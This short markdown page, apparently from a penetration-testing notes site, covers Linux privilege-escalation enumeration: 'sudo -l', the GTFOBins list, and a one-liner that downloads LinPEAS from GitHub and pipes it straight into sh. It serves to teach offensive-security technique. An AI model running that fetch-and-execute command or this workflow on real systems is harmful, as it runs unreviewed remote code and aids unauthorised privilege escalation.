---
title: Enumeration
layout: page
parent: privesc
---

# Enumeration

<details open markdown="block">
  <summary>
    Table of contents
  </summary>
  {: .text-delta }
1. TOC
{:toc}
</details>

---

## Linux

### Sudo

Lists the commands that the current user can run with sudo. This is useful for finding out if the user has permission to run any commands as root or other users.

```bash
sudo -l
```

### GTFOBins

GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions, if for instance the user can run them with sudo (as we just saw before) or as a setuid binary.
Refer to the [GTFOBins website](https://gtfobins.github.io/) for the full list of binaries and their exploits.

### LinPEAS

LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts.

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```


